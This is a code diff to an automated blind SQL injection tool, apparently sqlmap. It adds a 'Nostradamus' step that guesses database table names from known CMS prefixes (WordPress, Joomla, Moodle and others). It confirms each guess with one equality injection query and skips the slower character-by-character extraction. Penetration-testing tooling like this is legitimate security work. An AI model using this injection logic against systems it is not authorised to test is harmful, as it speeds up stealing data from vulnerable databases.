@@ -519,6 +519,76 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                         else:
                             return decodeIntToUnicode(candidates[0])
 
+        # ─── Nostradamus: Pre-extraction full value prediction ───
+        # If we know the length and the predictor has a high-confidence candidate,
+        # try to verify the full value with a single equality query BEFORE
+        # starting the character-by-character extraction.
+        if (kb.get("predictor") and not conf.get("noPredict")
+                and isinstance(length, int) and length > 3
+                and not partialValue and not kb.fileReadMode
+                and firstChar == 0):
+            predictor = kb.predictor
+            if predictor._initialized:
+                # Check if predictor is not auto-disabled
+                totalAttempts = predictor.stats_hits + predictor.stats_misses
+                hitRate = (predictor.stats_hits / totalAttempts) if totalAttempts > 0 else 1.0
+
+                if not (totalAttempts >= 20 and hitRate < 0.05):
+                    # Collect candidates to try:
+                    # 1. From quick schema tables (CMS-specific, exact length match)
+                    # 2. From trie predictions with known prefixes
+                    candidatesToTry = []
+
+                    # Source 1: Quick schema tables matching this length
+                    if predictor._detected_cms:
+                        for table in predictor.get_quick_schema_tables():
+                            if len(table) == length and table not in candidatesToTry:
+                                candidatesToTry.append(table)
+
+                    # Source 2: Trie predictions with CMS prefix
+                    if predictor._detected_cms and not candidatesToTry:
+                        cms_prefixes = {
+                            "wordpress": ["wp_"], "joomla": ["jos_"], "drupal": [],
+                            "magento": [], "prestashop": ["ps_"], "moodle": ["mdl_"],
+                            "django": ["auth_", "django_"], "phpbb": ["phpbb_"],
+                            "nextcloud": ["oc_"], "vtiger": ["vtiger_"],
+                            "dolibarr": ["llx_"], "glpi": ["glpi_"], "mantis": ["mantis_"],
+                        }
+                        for prefix in cms_prefixes.get(predictor._detected_cms, []):
+                            for cand, weight in predictor.predict(prefix, length_filter=length, max_results=10):
+                                if weight >= predictor.WEIGHT_STATIC_DICT and cand not in candidatesToTry:
+                                    candidatesToTry.append(cand)
+
+                    # Try up to 3 candidates (to avoid too many wasted queries)
+                    for bestCandidate in candidatesToTry[:3]:
+                        testValue = unescaper.escape("'%s'" % bestCandidate) if "'" not in bestCandidate else unescaper.escape("%s" % bestCandidate, quote=False)
+                        query = getTechniqueData().vector
+                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))
+                        query = agent.suffixQuery(query)
+                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
+                        incrementCounter(getTechnique())
+
+                        queryDuration = threadData.lastQueryDuration if hasattr(threadData, 'lastQueryDuration') else None
+
+                        if result:
+                            predictor.record_hit(bestCandidate, 0, queryDuration)
+                            predictor.learn(bestCandidate)
+
+                            infoMsg = "predictor pre-check hit: '%s' (skipped full extraction)" % bestCandidate
+                            logger.info(infoMsg)
+
+                            if conf.verbose in (1, 2) or conf.api:
+                                dataToStdout(filterControlChars(bestCandidate))
+
+                            finalValue = bestCandidate
+                            if showEta:
+                                progress.progress(length)
+
+                            hashDBWrite(expression, "%s%s%s" % (value, finalValue, PARTIAL_VALUE_MARKER if len(finalValue) < length else ""), check=False)
+                            return 0, finalValue
+                        else:
+                            predictor.record_miss(queryDuration)
+
         # Go multi-threading (--threads > 1)
         if numThreads > 1 and isinstance(length, int) and length > 1:
             threadData.shared.value = [None] * length
